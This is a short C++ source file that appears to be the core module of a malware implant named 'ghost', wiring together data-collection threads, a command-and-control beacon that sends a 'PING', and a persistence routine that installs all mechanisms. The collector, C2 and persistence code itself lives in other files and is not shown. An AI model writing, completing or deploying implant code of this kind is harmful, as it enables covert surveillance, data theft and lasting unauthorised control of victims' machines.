#include "ghost_core.h"
#include "../persistence/persistence.h"
#include "../collector/collector.h"
#include "../c2/c2.h"

namespace ghost {
    std::atomic<bool> g_Shutdown{false};

    bool Init() {
        collector::StartCollectionThreads();
        return true;
    }

    void Pulse() {
        uint8_t dummyData[] = "PING";
        c2::Beacon(dummyData, 4);
    }

    void Terminate() {
        collector::StopCollectionThreads();
    }

    namespace persistence {
        bool Anchor() {
            return InstallAllMechanisms();
        }
    }
}